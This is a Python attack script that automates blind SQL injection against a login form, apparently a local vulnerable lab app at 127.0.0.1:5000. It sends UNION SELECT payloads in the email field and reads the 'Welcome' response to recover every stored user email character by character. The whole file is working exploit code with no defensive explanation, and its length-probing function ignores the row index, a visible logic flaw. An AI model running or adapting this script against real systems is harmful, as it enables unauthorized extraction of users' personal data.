import requests
import string

# Set the target URL where the vulnerable app is running
TARGET_URL = "http://127.0.0.1:5000/login"

def is_match(payload):
    try:
        response = requests.post(
            TARGET_URL, 
            headers={"Content-Type": "application/x-www-form-urlencoded"}, 
            data={"email": payload, "password": "any_password"}
        )
        # print(f"Payload: {payload} -> Status: {response.status_code}, Response: {response.text[:200]}")
        return "Welcome" in response.text or "specific_success_text" in response.text
    except Exception as e:
        print(f"Error during request: {e}")
        return False


def extract_email_length(row_index):
    for length in range(1, 20):  # Support longer emails
        payload = f"' UNION SELECT NULL, NULL, NULL, NULL FROM users WHERE LENGTH(email)={length} --"
        if is_match(payload):
            return length
    return None

def extract_email_character(row_index, position):
    for char in string.ascii_letters + string.digits + "@._-":  # Email-safe characters
        payload = f"' UNION SELECT NULL, NULL, NULL, NULL FROM users WHERE SUBSTR((SELECT email FROM users LIMIT 1 OFFSET {row_index}), {position}, 1)='{char}' --"
        # print(f"Debugging query for index {row_index}, position {position}: {payload}")
        if is_match(payload):
            return char
    return None


# The rest remains the same


def extract_email(row_index):
    email_length = extract_email_length(row_index)
    if not email_length:
        print(f"[-] Could not determine length for email at index {row_index}")
        return None

    print(f"[+] Email Length for index {row_index}: {email_length}")
    email = ""
    for position in range(1, email_length + 1):
        char = extract_email_character(row_index, position)
        if char:
            email += char
            print(f"[+] Character at position {position}: {char}")
        else:
            # print(f"[-] Failed to extract character at position {position}")
            break
    return email


def extract_all_emails():
    """
    Extract all emails from the database by iterating through rows.
    """
    emails = []
    row_index = 0
    while True:
        print(f"[+] Extracting email at index {row_index}...")
        email = extract_email(row_index)
        if email:
            print(f"[+] Extracted Email: {email}")
            emails.append(email)
            row_index += 1
        else:
            print("[-] No more emails found.")
            break
    return emails

if __name__ == "__main__":
    all_emails = extract_all_emails()
    if all_emails:
        print(f"[+] All Extracted Emails:\n{all_emails}")
    else:
        print("[-] No emails could be extracted.")
